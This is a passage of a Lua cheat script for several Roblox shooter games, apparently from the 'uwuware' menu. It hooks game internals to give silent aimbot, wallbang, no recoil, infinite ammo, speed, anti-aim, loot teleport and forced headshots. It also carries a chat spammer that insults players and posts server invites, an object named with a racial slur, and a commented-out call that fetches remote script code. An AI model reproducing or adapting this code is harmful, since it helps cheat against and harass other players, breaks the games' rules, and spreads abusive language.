						Args[1] = Args[1] * CFrame.new(X, Y, library.flags[GameTitle .. " Flip Y"] and dl * 2 or dl)
					end
				end
			end
		end

		return Old_call(self, unpack(Args))
	end)

	--Games
	local Loaded, LoadError = true
	library.flagprefix = GameTitle

	Loaded, LoadError = pcall(function()

		if GameTitle == "Bad Business" then

			local BadBusinessTab = library:AddTab"Bad Business"
			local BadBusinessColumn = BadBusinessTab:AddColumn()
			local BadBusinessColumn1 = BadBusinessTab:AddColumn()

			local BadBusinessMain = BadBusinessColumn:AddSection"Main"
			library.options["Aimbot Mode"]:AddValue"Silent"
			BadBusinessMain:AddToggle({text = "Wallbang"})

			local BadBusinessMisc = BadBusinessColumn:AddSection"Misc"
			BadBusinessMisc:AddSlider({text = "Speed Multiplier", min = 1, max = 3, float = 0.1})
			BadBusinessMisc:AddSlider({text = "Jump Multiplier", min = 1, max = 5, float = 0.1})
			--BadBusinessMain:AddToggle({text = "Custom Pitch"}):AddSlider({text = "Pitch", min = -1.5, max = 1.5, float = 0.1})

			local WeaponMods = BadBusinessColumn1:AddSection"Weapon Mods"
			WeaponMods:AddToggle({text = "No Recoil"})
			WeaponMods:AddToggle({text = "No Bullet Drop"})

			local OldRay
			repeat wait(1)
				for i, v in next, getreg(true) do
					if typeof(v) == "table" then
						if rawget(v, "GetCharacter") then
							NameRequest = debug.getupvalue(v.GetPlayerFromCharacter, 1)
						elseif rawget(v, "GetPlayerTeam") then
							TeamRequest = v.GetPlayerTeam
						elseif rawget(v, "CastGeometryAndEnemies") then
							OldRay = v.CastGeometryAndEnemies
						end
					end
				end
			until NameRequest and TeamRequest and OldRay

			for i,v in next, getgc(true) do
				if typeof(v) == "table" and rawget(v, "Fire") and rawget(v, "Update") then
					local Fire = v.Fire
					v.Fire = function(...)
						if library then
							if not library.flags[GameTitle .. " No Recoil"] then
								Fire(...)
							end
						else
							Fire(...)
						end
					end
					local Update = v.Update
					v.Update = function(...)
						if library and library.flags[GameTitle .. " No Recoil"] then
							return Vector2.new(0, 0)
						else
							return Update(...)
						end
					end
				end
			end

			local RayHook
			RayHook = hookfunction(OldRay, function(...)
				if not library then return RayHook(...) end
				local Args = {...}

				if Args[5] then
					if library.flags[GameTitle .. " No Bullet Drop"] then
						Args[5].Gravity = 0
					end
				end

				return RayHook(...)
			end)

		elseif GameTitle == "Phantom Forces" then

			--local PFTab = library:AddTab"Phantom Forces"
			--library.options["Aimbot Mode"]:AddValue"Silent"
			local client = {}

			repeat wait(1)
				for k, v in next, getgc(true) do
					if type(v) == "table" and rawget(v, "removecharacterhash") then
						NameRequest = getupvalue(v.removecharacterhash, 3)
					end
					if type(v) == "function" then
						if getinfo(v).name == "bulletcheck" then
							client.bulletcheck = v
						end
						if getinfo(v).name == "trajectory" then
							client.traj = v
						end
						for k1, v1 in next, getupvalues(v) do
							if type(v1) == "table" then
								if rawget(v1, "send") then
									client.net = v1
								elseif rawget(v1, "gammo") then
									client.logic = v1
								elseif rawget(v1, "loadknife") then
									client.char = v1
								elseif rawget(v1, "basecframe") then
									client.cam = v1
								elseif rawget(v1, "votestep") then
									client.hud = v1
									HealthRequest = client.hud
								elseif rawget(v1, "getbodyparts") then
									client.repl = v1
								elseif rawget(v1, "checkkillzone") then
									client.roundsystem = v1
								end
							end
						end
					elseif type(v) == "table" then
						if rawget(v, "deploy") then
							client.menu = v
						elseif rawget(v, "new") and rawget(v, "step") then
							client.particle = v
						end
					end
				end
			until NameRequest and HealthRequest and client.logic
			ClientCharRequest = client

			local ReplacedFuncs = {}

			library:AddConnection(inputService.InputBegan, function(input)
				if input.UserInputType.Name == "MouseButton1" or input.UserInputType.Name == "MouseButton2" then
					if client.logic.currentgun then
						if client.logic.currentgun.shoot then
							local func = client.logic.currentgun.shoot
							if not ReplacedFuncs[func] then
								client.logic.currentgun.shoot = function(self, ...)
									if library and not library.open then
										func(self, ...)
									end
								end
								ReplacedFuncs[func] = true
							end
						end
						if client.logic.currentgun.setaim then
							local func = client.logic.currentgun.setaim
							if not ReplacedFuncs[func] then
								client.logic.currentgun.setaim = function(self, ...)
									if library and not library.open then
										func(self, ...)
									end
								end
								ReplacedFuncs[func] = true
							end
						end
					end
				end
			end)

			--Meta.__namecall = newcclosure(function(self, ...)
			--	if checkcaller() then return Old_call(self, ...) end
			--	local Args = {...}
			--	local Method = getnamecallmethod()
			--	if Method:find("Ray") and Method:lower():find("list") then
			--		if library.flags["Wallbang"] then
			--			local n = #Args[2]
			--			Args[2][n + 1] = workspace.Map
			--		end
			--		if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
			--			--Args[1] = Ray.new(Camera.CFrame.p, (library.Aimbot.Position3d - Camera.CFrame.p).Unit * library.flags["Aimbot Max Distance"])
			--		end
			--	end
			--	return Old_call(self, unpack(Args))
			--end)

		elseif GameTitle == "Q-Clash" then

			--[[
			local SetHealth
			repeat wait(1)
				for i,v in next, getgc(true) do
					if type(v) == "table" and rawget(v, "SetHealth") then

						SetHealth = v.SetHealth

						break
					end
				end
			until SetHealth

			local Health = {}
			HealthRequest = function(Char)
				if Health[Char] then
					return Health[Char].Health, Health[Char].MaxHealth
				end
			end

			local o
			o = hookfunction(SetHealth, function(a, b, c)

				local Character = FFA(a.uiElements, "Model")
				Character = Character and FFCoC(Character, "Humanoid")
				if Character then
					if not Health[Character] then
						Health[Character] = {}
					end

					Health[Character].Health = math.ceil(b + c)
					Health[Character].MaxHealth = a.maxHealth
				end

				return o(a, b, c)
			end)
			--]]

		elseif GameTitle == "Arsenal" then


			local ArsenalTab = library:AddTab"Arsenal":AddColumn()
			local ArsenalMain = ArsenalTab:AddSection"Main"
			library.options["Aimbot Mode"]:AddValue"Silent"
			ArsenalMain:AddToggle({text = "Wallbang"})
			--ArsenalWindow:AddToggle({text = "No Recoil"})
			ArsenalMain:AddToggle({text = "Inf Ammo"})
			ArsenalMain:AddToggle({text = "Inf Jump"})
			VisualsMiscSection:AddColor({text = "Golden Weapon Color"})

			for _,Func in next, getgc() do
				if typeof(Func) == "function" then
					local Info = debug.getinfo(Func)
					if Info.name == "firebullet" then
						local o
						o = hookfunction(Func, function(...)
							if library and library.flags[GameTitle .. " Inf Ammo"] then
								setupvalue(o, 5, 999)
							end
							return o(...)
						end)
					end
				end
			end

			local Jumping
			local function InfJump()
				while library and Jumping do
					wait()
					local Char = Players[Client].Character
					if Char then
						Char.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
					end
				end
			end

			library:AddConnection(inputService.InputBegan, function(Input)
				if library.flags[GameTitle .. " Inf Jump"] and not inputService:GetFocusedTextBox() then
					if Input.KeyCode == Enum.KeyCode.Space then
						Jumping = true
						InfJump()
					end
				end
			end)

			library:AddConnection(inputService.InputEnded, function(Input)
				if Input.KeyCode == Enum.KeyCode.Space then
					Jumping = false
				end
			end)

		elseif GameTitle == "Unit: Classified" then

			local UnitClient = getsenv(Client:WaitForChild"PlayerGui":WaitForChild"GUI":WaitForChild"Client")
			local Shake = UnitClient.ShakeCam

			local UnitTab = library:AddTab"Unit: Classified"
			local UnitColumn = UnitTab:AddColumn()
			--local UnitColumn1 = UnitTab:AddColumn()

			local UnitMain = UnitColumn:AddSection"Main"
			library.options["Aimbot Mode"]:AddValue"Silent"
			UnitMain:AddToggle({text = "Wallbang"})

			--local WeaponMods = UnitColumn1:AddSection"Weapon Mods"
			UnitMain:AddToggle({text = "No Recoil", callback = function(State)
				UnitClient.ShakeCam = State and function() end or Shake
			end})
			UnitMain:AddToggle({text = "Inf Ammo", callback = function(State)
				if State then
					while library and library.flags[GameTitle .. " Inf Ammo"] and wait(1) do
						UnitClient.refillammo(math.huge)
					end
				end
			end})

		elseif GameTitle == "Counter Blox" then

			local CBTab = library:AddTab"Counter Blox"
			local MainColumn = CBTab:AddColumn()
			local MainColumn1 = CBTab:AddColumn()
			local e1 = MainColumn:AddSection"Rage"
			local e2 = tick()
			--local e4 = game:HttpGet("https://uwuware.cool/scripts/getfile.php?ID=rrkbB7GagR8Vbg4byAdJvw9HouiWOG9I", true)

			local CBClient = {}
			for i,v in next, getgc() do
				if typeof(v) == "function" then
					local info = debug.getinfo(v)
					if info.name == "resetaccuracy" then
						CBClient.resetaccuracy = v
					elseif info.name == "firebullet" then
						CBClient.firebullet = v
					end
				end
			end

			local function GetDamage(e7, e8, e9)
				local ClientChar = Players[Client].Character
				if ClientChar then
					--local eb
					local Gun = FFC(RepStorage.Weapons, ClientChar.EquippedTool.Value)
					if Gun then
						local ec = eb.Penetration.Value * 0.01
						local ed = eb.Range.Value
						local eg = ClientChar.HumanoidRootPart.Position
						local ej = 0
						local ek = 0
						local el, em, en
						local eo = 1
						local ep = 1
					end
				end
				local Ignores = {
					Camera,
					ClientChar,
					workspace.Debris,
					workspace.Ray_Ignore,
					workspace.Map:WaitForChild("Clips"),
					workspace.Map:WaitForChild("SpawnPoints")
				}
				for u, ea in next, e7.Character:GetDescendants() do
					if ea.Name ~= e8 then
						Ignores[#Ignores + 1] = ea
					end
				end
				
				repeat
					local eh = CFrame.new(Vector3.new(eg.X, ClientChar.Head.Position.Y, eg.Z), library.Aimbot.Position3d).LookVector.unit * ed * 0.0694
					el, em, en = workspace:FindPartOnRayWithIgnoreList(Ray.new(Vector3.new(eg.X, ClientChar.Head.Position.Y, eg.Z), eh), Ignores)
					if el and el.Parent then
						eo = 1
						if el.Material == Enum.Material.DiamondPlate then
							eo = 3
						elseif el.Material == Enum.Material.CorrodedMetal or el.Material == Enum.Material.Metal or el.Material == Enum.Material.Concrete or el.Material == Enum.Material.Brick then
							eo = 2
						elseif el.Name == "Grate" or el.Material == Enum.Material.Wood or el.Material == Enum.Material.WoodPlanks or el and el.Parent and FFCoC(el.Parent, "Humanoid") then
							eo = 0.1
						elseif el.Transparency == 1 or el.CanCollide == false or el.Name == "Glass" or el.Name == "Cardboard" or el:IsDescendantOf(workspace.Ray_Ignore) or el:IsDescendantOf(workspace.Debris) or el and el.Parent and el.Parent.Name == "Hitboxes" then
							eo = 0
						elseif el.Name == "nowallbang" then
							eo = 100
						elseif FFC(el, "PartModifier") then
							eo = el.PartModifier.Value
						end
						local eq, er = workspace:FindPartOnRayWithWhitelist(Ray.new(em + eh * 1, eh * -2), {el})
						local es = (er - em).Magnitude
						local es = es * eo
						ek = math.min(ec, ek + es)
						ep = 1 - ek / ec
						if eo > 0 then
							ej = ej + 1
						end
						if el and el.Parent and el.Parent.Name == "Hitboxes" or el and el.Parent and el.Parent.Parent and FFCoC(el.Parent.Parent, "Humanoid") and (1 > el.Transparency or el.Name == "HeadHB") and el.Parent:IsA("Model") then
							Ignores[#Ignores] = el.Parent
						else
							Ignores[#Ignores] = el
						end
					end
				until el == nil or el.Parent == e7.Character or ek >= ec or ep <= 0 or el.Name == "lastbacktrack" or el.Name == "backtrack" or ej >= 4
				if ej >= 4 or eb.DMG.Value*ep*4 < library.flags[GameTitle .. " Min Damage"] * 0.01 then
					return
				end
				if tick() - e2 > eb.FireRate.Value then
					e2 = tick()
					if library.flags[GameTitle .. " Shot Delay"] then
						wait(library.flags[GameTitle .. " Delay Amount"] * 0.001)
					end
					if eb.Name == "R8" then
						mouse2click()
					else
						mouse1click()
					end
				end
			end
			--e1:AddToggle({text = "Autowall", callback = function(State) if State then library.options["Aimbot Mode"]:SetValue"Silent" end end}):AddSlider({text = "Min Damage", min = 1, max = 100})
			--e1:AddToggle({text = "Body Aim"})
			--e1:AddToggle({text = "Shot Delay"}):AddSlider({text = "Amount", suffix = "ms", flag = "Delay Amount", min = 30, max = 1000})
			local et
			e1:AddToggle({text = "Anti-Aim", callback = function()
				while library and library.flags[GameTitle .. " Anti-Aim"] and wait() do
					if Client.Character and FFCoC(Client.Character, "Humanoid") and FFC(Client.Character, "HumanoidRootPart") then
						Client.Character.Humanoid.AutoRotate = false
						local eu = Client.Character.HumanoidRootPart
						local ev = library.flags[GameTitle .. " Pitch"] < 0 and -Camera.CFrame.LookVector or Camera.CFrame.LookVector
						local ew = CFrame.Angles(0, 0, 0)
						if library.flags[GameTitle .. " Yaw"] == "Manual" then
							ew = CFrame.Angles(0, math.rad(et == 1 and -90 or 90), 0)
						elseif library.flags[GameTitle .. " Yaw"] == "Auto" then
							if ce.X > WTSP(Camera, eu.Position + Vector3.new(ev.X * 5, 0, ev.Z * 5)).X then
								ew = CFrame.Angles(0, math.rad(-90), 0)
							else
								ew = CFrame.Angles(0, math.rad(90), 0)
							end
						end
						eu.CFrame = CFrame.new(eu.Position, eu.Position + Vector3.new(ev.X, 0, ev.Z)) * ew
					end
				end
				if Client.Character and FFCoC(Client.Character, "Humanoid") then
					Client.Character.Humanoid.AutoRotate = true
				end
			end})
			e1:AddSlider({text = "Pitch", value = 0, min = -1, max = 1, float = 0.1, callback = function(cB)
				if library.flags[GameTitle .. " Anti-Aim"] then
					RepStorage.Events.ControlTurn:FireServer(cB)
				end
			end})
			e1:AddList({text = "Yaw", values = {"Backwards", "Manual"}})
			e1:AddBind({text = "Yaw Left", key = "Left", callback = function()
				et = 1
			end})
			e1:AddBind({text = "Yaw Right", key = "Right", callback = function()
				et = 0
			end})
			local eH = {"5007348397", "5007348117", "5007347746", "5007347082"}
			local eE = MainColumn1:AddSection"Misc Cheats"
			--library.options["Aimbot Mode"]:AddValue"Silent"
			eE:AddToggle({text = "Wallbang"})
			--eE:AddToggle({text = "Always Headshot"})
			eE:AddToggle({text = "Hitsound"}):AddList({flag = "Hitsounds", values = {
				["Bameware"] = "3124331820",
				["Skeet"] = "4753603610",
				["Osu Combobreak"] = "3547118594",
				["The Ting Goes"] = function()
					return eH[math.random(1, 4)]
				end,
				["Bonk"] = "3765689841",
				["Oof"] = "4792539171",
				["Clink"] = "711751971",
				["CoD"] = "160432334",
				["Lazer Beam"] = "130791043",
				["Windows XP Error"] = "160715357",
				["Windows XP Ding"] = "489390072",
				["HL Med Kit"] = "4720445506",
				["HL Door"] = "4996094887",
				["HL Crowbar"] = "546410481",
				["HL Revolver"] = "1678424590",
				["HL Elevator"] = "237877850",
				["TF2 Hitsound"] = "3455144981",
				["TF2 Critical"] = "296102734",
				["TF2 Beepo"] = "3466987025",
				["TF2 Bat"] = "3333907347",
				["TF2 Pow"] = "679798995",
				["TF2 You Suck"] = "1058417264",
				["Quake Hitsound"] = "4868633804",
				["Fart"] = "131314452"
			}})
			eE:AddSlider({text = "Hitsound Volume", min = 0, max = 20, value = 2})

			eE:AddToggle({text = "Bhop", callback = function(cc)
				if cc then
					while library and library.flags[GameTitle .. " Bhop"] and wait() do
						if Client.Character and FFCoC(Client.Character, "Humanoid") then
							if inputService:IsKeyDown(Enum.KeyCode.Space) then
								Client.Character.Humanoid.Jump = true
							end
						end
					end
				end
			end}):AddSlider({text = "Speed", flag = "Bhop Speed", min = 20, max = 40})
			local eF = false
			--eE:AddButton({text = "Unlock Skins"})

			local ex = MainColumn1:AddSection"Weapon Mods"
			local ey = {}
			local function ez(aS, eA, G)
				if aS then
					for V, v in next, RepStorage.Weapons:GetDescendants() do
						if v.Name == eA then
							ey[v] = {value = v.Value}
							v.Value = G
							for eC, eD in next, v:GetChildren() do
								ey[eD] = {value = eD.Value}
								eD.Value = G
							end
						end
					end
				else
					for V, v in next, RepStorage.Weapons:GetDescendants() do
						if v.Name == eA and ey[v] then
							v.Value = ey[v].value
							for eC, eD in next, v:GetChildren() do
								eD.Value = ey[eD].value
							end
						end
					end
				end
			end
			--ex:AddToggle({text = "No Recoil"})
			--ex:AddToggle({text = "No Spread"})
			ex:AddToggle({text = "Inf Ammo", callback = function(cc)
				ez(cc, "Ammo", 9999)
				ez(cc, "StoredAmmo", 9999)
			end})
			ex:AddToggle({text = "Instant Reload", callback = function(cc)
				ez(cc, "ReloadTime", 0.1)
			end})
			ex:AddToggle({text = "Quickfire", callback = function(cc)
				ez(cc, "FireRate", 0.1)
			end})
			ex:AddToggle({text = "Quickdraw", callback = function(cc)
				ez(cc, "EquipTime", 0)
			end})
			ex:AddToggle({text = "Automatic Weapons", callback = function(cc)
				ez(cc, "Auto", true)
			end})

			VisualsMiscSection:AddToggle({text = "Bullet Tracers"}):AddSlider({text = "Lifetime", suffix = "s", min = 0.5, max = 5, float = 0.1}):AddColor({flag = "Bullet Tracer Color"})
			local eJ
			VisualsMiscSection:AddToggle({text = "Thirdperson", callback = function(State)
				if eJ then
					eJ = false
					if Client.Character then
						Client.CameraMinZoomDistance = 0
						Client.CameraMaxZoomDistance = 0
					end
				else
					library.options[GameTitle .. " TP Bind"].callback()
				end
			end}):AddSlider({text = "Distance", flag = "TP Distance", min = 5, max = 30}):AddBind({flag = "TP Bind", callback = function()
				if library.flags[GameTitle .. " Thirdperson"] then
					eJ = not eJ
					if eJ then
						while library and library.flags[GameTitle .. " Thirdperson"] and eJ and wait() do
							if Client.Character then
								Client.CameraMinZoomDistance = library.flags[GameTitle .. " TP Distance"]
								Client.CameraMaxZoomDistance = library.flags[GameTitle .. " TP Distance"]
							end
						end
						if Client.Character then
							Client.CameraMinZoomDistance = 0
							Client.CameraMaxZoomDistance = 0
						end
					end
				end
			end})
			VisualsMiscSection:AddToggle({text = "Transparent Arms"}):AddColor({flag = "Arms Color"})
			VisualsMiscSection:AddToggle({text = "Transparent Weapon"}):AddColor({flag = "Weapon Color"})
			library:AddConnection(Camera.ChildAdded, function(di)
				if di.Name == "Arms" then
					wait()
					if not FFC(di, "HumanoidRootPart") then return end
					di.HumanoidRootPart.Transparency = 1
					if library.flags[GameTitle .. " Transparent Arms"] then
						for u, di in next, di:GetChildren() do
							if string.find(di.Name, "Arms") then
								for u, eK in next, di:GetChildren() do
									eK.Material = "ForceField"
									eK.Color = library.flags[GameTitle .. " Arms Color"]
									eK.Transparency = 0.6
									local eL =
										FFC(eK, "Glove") or FFC(eK, "LGlove") or
										FFC(eK, "RGlove")
									if eL then
										eL.Material = "ForceField"
										eL.Mesh.VertexColor = Vector3.new(eK.Color.r, eK.Color.g, eK.Color.b)
										eL.Transparency = 0.4
									end
									if FFC(eK, "Sleeve") then
										eK.Sleeve.Mesh.VertexColor = Vector3.new(eK.Color.r, eK.Color.g, eK.Color.b)
										eK.Sleeve.Material = "ForceField"
										eK.Sleeve.Transparency = 0.6
									end
								end
							end
						end
					end
					if library.flags[GameTitle .. " Transparent Weapon"] then
						for u, d1 in next, di:GetChildren() do
							if d1:IsA "MeshPart" or d1:IsA "Part" then
								d1.Material = "ForceField"
								d1.Color = library.flags[GameTitle .. " Weapon Color"]
							end
						end
					end
				end
			end)
			VisualsMiscSection:AddToggle({text = "Viewmodel Changer"})
			VisualsMiscSection:AddSlider({text = "X Offset", value = 0, min = -20, max = 20})
			VisualsMiscSection:AddSlider({text = "Y Offset", value = 0, min = -20, max = 20})
			VisualsMiscSection:AddSlider({text = "Z Offset", value = 0, min = -20, max = 20})
			VisualsMiscSection:AddToggle({text = "Flip Y"})
			VisualsMiscSection:AddToggle({text = "Flip Z"})
			local eN
			VisualsMiscSection:AddToggle({text = "Color Correction", callback = function(cc)
				eN = FFC(Lighting, "Niggapenis")
				if not eN then
					eN = library:Create("ColorCorrectionEffect", {
						Name = "Niggapenis",
						TintColor = library.flags[GameTitle .. " Tint Color"],
						Brightness = 0,
						Parent = Lighting
					})
				end
				eN.Enabled = cc
			end}):AddColor({flag = "Tint Color", callback = function(aD)
				if eN then
					eN.TintColor = aD
				end
			end})
			local eP

			VisualsMiscSection:AddToggle({text = "Nightmode", callback = function(cc)
				eP = FFC(Lighting, "Nightmode")
				if not eP then
					eP = library:Create("ColorCorrectionEffect", {
						Name = "Nightmode",
						TintColor = Color3.fromRGB(255, 255, 255),
						Brightness = -0.2,
						Contrast = -0.2,
						Parent = Lighting
					})
				end
				eP.Enabled = cc
				while library and library.flags[GameTitle .. " Nightmode"] and wait() do
					Lighting.ClockTime = 4
				end
				Lighting.ClockTime = 12
			end})

			--No recoil
			RecoilFunc = CBClient.resetaccuracy
			--CBClient.resetaccuracy = function(...)
			--	if library.open then
			--		return
			--	end
			--	if library.flags[GameTitle .. " No Recoil"] then
			--		CBClient.resetaccuracy()
			--	end
			--	return RecoilFunc
			--end

		elseif GameTitle == "Strucid" then

			local StrucidTab = library:AddTab"Strucid":AddColumn()
			local StrucidMain = StrucidTab:AddSection"Main"
			library.options["Aimbot Mode"]:AddValue"Silent"

		elseif GameTitle == "Jailbreak" then

			--//local JailbreakTab = MainWindow:AddTab"Jailbreak"
			--//JailbreakTab:Init()
			--//library.options["Aimbot Mode"]:AddValue"Silent"
			--//local InfWallbang = JailbreakTab:AddToggle"Wallbang"

			--//Meta.__index = newcclosure(function(table, index)
			--//	if tostring(table) == "Tip" and index == "Position" and AimbotSilent.state and library.Aimbot.Position3d then
			--//		local Cast = Ray.new(Camera.CFrame.p, (library.Aimbot.Position3d - Camera.CFrame.p).Unit * library.flags["Aimbot Max Distance"])
			--//		local Hit, Position = workspace:FindPartOnRay(Cast, GetCharacter(Client))
			--//		if Hit then
			--//			return Position
			--//		end
			--//	end
			--//	return Old_index(table, index)
			--//end)

		elseif GameTitle == "MURDER" then

			local MurderTab = library:AddTab"MURDER":AddColumn()
			local MurderMain = MurderTab:AddSection"Main"
			library.options["Aimbot Mode"]:AddValue"Silent"
			MurderMain:AddToggle({text = "Wallbang"})
			--MurderMain:AddToggle({text = "Auto Grab Revolver", callback = function(State)
			--	if State then
			--		local Revolver = FFC(workspace.Debris, "Revolver")
			--		local Character = Players[Client].Character
			--		if Character and Revolver and Client.Status.Role.Value ~= "Murderer" and not Client.Status.HasRevolver.Value then
			--			local OldPosition = GBB(Character).Position
			--			local NewPos = GBB(Revolver).Position
			--			if (NewPos - OldPosition).Magnitude < 200 then
			--				Character:MoveTo(NewPos)
			--				wait(0.5)
			--				Character:MoveTo(OldPosition)
			--			end
			--		end
			--	end
			--end})
			MurderMain:AddButton({text = "Collect Loot", callback = function()
				local Character = Players[Client].Character
				if Character then
					local OldPosition = GBB(Character).Position
					for _,Prop in next, workspace.Debris.Props:GetChildren() do
						if FFC(Prop, "Green") and (Prop.Position - OldPosition).Magnitude < 200 then
							Character:MoveTo(Prop.Position)
							wait(0.5)
							RepStorage.Events.Loot:FireServer(Prop)
							wait(0.5)
						end
					end
					Character:MoveTo(OldPosition)
				end
			end})
			VisualsMiscSection:AddColor({text = "Murderer Color", color = Color3.new(1, 0, 0)})
			VisualsMiscSection:AddColor({text = "Detective Color", color = Color3.new(0, 0, 1)})

			library:AddConnection(workspace.Debris.ChildAdded, function(Child)
				wait(2)
				if Child.Name == "Revolver" and library.flags["Auto Grab Revolver"] then library.options["Auto Grab Revolver"].callback() end
			end)

		elseif GameTitle == "Ace Of Spadez" then

			local Events
			repeat wait(1) Events = FFC(RepStorage, "RemoteEvents") until Events

			local Say = {
				"You don't use uwuware? Okay bro,,, dot dot dot",
				"Did you seriously just die again?",
				"Yeah sorry, the owner made the chat spammer,,,",
				"Are you an ape and keep getting killed? Thought so.",
				"Looking for an easy W? Too bad monkey, ooh ah ah ooo",
				"Interested in what you see? Join the server: pBRqP4xT9P",
				"Have I died yet? No clue I'm just a chat spammer,,,",
				"Ok but fr fr bro, you need to get this,,, here's an invite: gyEehEx",
				"Inteque smells like cheese :|"
			}

			local WeaponSystem = Client.PlayerScripts.WeaponSystem
			local Gun = WeaponSystem.Gun

			local AceTab = library:AddTab"Ace of Spadez":AddColumn()
			local AceMain = AceTab:AddSection"Main"
			library.options["Aimbot Mode"]:AddValue"Silent"
			AceMain:AddToggle({text = "Wallbang"})
			AceMain:AddToggle({text = "Inf Ammo", callback = function(State)
				Gun.Ammo.Value = State and math.huge or Gun.Ammo.Max.Value
				Gun.Reserves.Value = State and math.huge or Gun.Reserves.Max.Value
			end})
			--AceWindow:AddToggle({text = "Infinite Grenades", callback = function(State)
			--	WeaponSystem.Explosive.Amount.Value = State and math.huge or WeaponSystem.Explosive.Amount.Max.Value
			--end})
			AceMain:AddToggle({text = "No Recoil"})

			local AceOther = AceTab:AddSection"Other"
			AceOther:AddToggle({text = "No Fog", callback = function(State)
				Lighting.FogStart = State and 0 or 325
				Lighting.FogEnd = State and 9e9 or 650
			end})
			AceOther:AddToggle({text = "No Fall Damage", callback = function(State)
				local Character = Players[Client].Character
				if State and Character then
					Character.Animate.FallDamageServer:Destroy()
				end
			end})
			AceOther:AddToggle({text = "Speed", callback = function(State)
				if State then
					while library and library.flags[GameTitle .. " Speed"] and wait() do
						local Character = Players[Client].Character
						if Character then
							Character.Humanoid.WalkSpeed = library.flags[GameTitle .. " Amount"]
						end
					end
				end
			end}):AddSlider({text = "Amount", min = 36, max = 300})
			AceOther:AddToggle({text = "Chat Spammer", callback =
				function(State)
					if State then
						while library and wait(5) and library.flags[GameTitle .. " Chat Spammer"] do
							Events.Chat.SendMessage:InvokeServer(Say[math.random(1, #Say)])
						end
					end
				end
			})

			library:AddConnection(Gun.Ammo.Changed, function()
				if library.flags[GameTitle .. " Inf Ammo"] then
					Gun.Ammo.Value = math.huge
				end
			end)

			library:AddConnection(Gun.Reserves.Changed, function()
				if library.flags[GameTitle .. " Inf Ammo"] then
					Gun.Reserves.Value = math.huge
				end
			end)

			--library:AddConnection(WeaponSystem.Explosive.Ammount.Changed, function()
			--	if library.flags["Infinite Grenades"] then
			--		WeaponSystem.Explosive.Ammount.Value = math.huge
			--	end
			--end)

			library:AddConnection(Client.CharacterAdded, function(Character)
				wait(1)
				if library.flags[GameTitle .. " No Fall Damage"] and Players[Client].Character then
					Character.Animate.FallDamageServer:Destroy()
				end
			end)

		elseif GameTitle == "Sound Space" then

			AimbotTab.canInit = false
			VisualsTab.canInit = false
			local SoundTab = library:AddTab"Sound Space":AddColumn()
			local SoundMain = SoundTab:AddSection"Main"
			local Loop
			SoundMain:AddToggle({text = "Auto Player", callback = function(State)
				if State then
					Loop = library:AddConnection(runService.RenderStepped, function()
						if FFC(workspace.Client, "Background") and FFC(workspace.Client.Background, "Squares") then
							if library.flags["Silent"] then
								workspace.Client.CameraPos.Position = Vector3.new(7, 3, 0)
							else
								if library.Aimbot.Target and not library.open then
									local Position, Vis = WTSP(Camera, Vector3.new(0.05, library.Aimbot.Position3d.Y, library.Aimbot.Position3d.Z))
									local X = Position.X - Mouse.X
									local Y = Position.Y - Mouse.Y
									if library.flags[GameTitle .. " Randomization"] then
										if X > 10 or Y > 10 then
											X = X + math.random(39, library.flags[GameTitle .. " Randomize Amount"])
											Y = Y + math.random(39, library.flags[GameTitle .. " Randomize Amount"])
										end
									end
									mousemoverel(X / library.flags[GameTitle .. " Smoothness"], Y / library.flags[GameTitle .. " Smoothness"])
								end
							end
							local Distance = 9e9
							for _,Square in next, workspace:GetDescendants() do
								if tonumber(Square.Name) then
									pcall(function()
										local NewDistance = (Square.Position - Camera.CFrame.p).Magnitude
										if NewDistance <= Distance then
											library.Aimbot.Target = Square
											Distance = NewDistance
										end
									end)
								end
							end
						end
					end)
				else
					Loop:Disconnect()
				end
			end})

			SoundMain:AddSlider({text = "Smoothness", min = 1, max = 50})
			SoundMain:AddToggle({text = "Randomization"})
			SoundMain:AddSlider({text = "Amount", min = 40, max = 100})
			--SoundMain:AddToggle({text = "Silent"})

			--Meta.__index = newcclosure(function(t, i)
			--	if checkcaller() then return Old_index(t, i) end
			--	if library.flags[GameTitle .. " Silent"] and library.Aimbot.Position3d then
			--		if tostring(getfenv(1).script) == "GameScript" then
			--			if t == Camera and i == "CFrame" then
			--				return CFrame.new(Vector3.new(7, 3, 0), Vector3.new(0.05, library.Aimbot.Position3d.Y, library.Aimbot.Position3d.Z))
			--			end
			--		end
			--	end

			--	return Old_index(t, i)
			--end)

		elseif GameTitle == "KAT" then

			--local KatTab = library:AddTab"KAT"
			--local KatColumn = KatTab:AddColumn()

			--local KatMain = KatColumn:AddSection"Main"
			library.options["Aimbot Mode"]:AddValue"Silent"
			--//KatWindow:AddToggle({text = "Wallbang"})
			VisualsMiscSection:AddColor({text = "Murderer Color", color = Color3.new(1, 0, 0)})
			VisualsMiscSection:AddColor({text = "Sheriff Color", color = Color3.new(0, 0, 1)})

		elseif GameTitle == "MMC Zombies Project" then

			local MMCTab = library:AddTab"MMC ZP"
			local MMCColumn = MMCTab:AddColumn()
			local MMCColumn1 = MMCTab:AddColumn()
			local MMCMain = MMCColumn:AddSection"Main"
			library.options["Aimbot Mode"]:AddValue"Silent"
			MMCMain:AddToggle({text = "Wallbang"})
			MMCMain:AddToggle({text = "Always Headshot"})
			MMCMain:AddToggle({text = "Speed"}):AddSlider({text = "Amount", min = 14, max = 50})

			local WeaponMods = MMCColumn1:AddSection"Weapon Mods"
			WeaponMods:AddToggle({text = "No Recoil"})
			WeaponMods:AddToggle({text = "Automatic Weapons"})
			WeaponMods:AddToggle({text = "Quickdraw"})

			library:AddConnection(Client.Character.Humanoid.Changed, function()
				if library.flags["Speed"] then
					Client.Character.Humanoid.WalkSpeed = library.flags["Amount"]
				end
			end)

			local Event = RepStorage.conn.ev
			local Network = require(Client.PlayerScripts.framework.core.network)
			local Old_hit = Network.hit.send
			local GunSystem = require(Client.PlayerScripts.framework.core.gunsys)
			local Old_fire = GunSystem.fire

			AddTracker(workspace.map.enemies)

			Network.hit.send = function(b, c, d, e, f)
				if not library then return Old_hit(b, c, d, e, f) end
				if library.flags["Always Headshot"] then
					f = FFC(c.Parent, "Head") or f
					e = f.Position
				end
				Old_hit(b, c, d, e, f)
			end

			local Old_configs = {}
			for _, v in next, RepStorage.assets.guns:GetChildren() do
				for _, g in next, v:GetChildren() do
					Old_configs[g.Name] = require(g.config)
				end
			end

			GunSystem.fire = function(b, ...)
				if not library then return Old_fire(b, ...) end
				Old_config = Old_configs[b.model.Name]

				b.config.firing.semi = library.flags[GameTitle .. " Automatic Weapons"] and false or Old_config.firing.semi
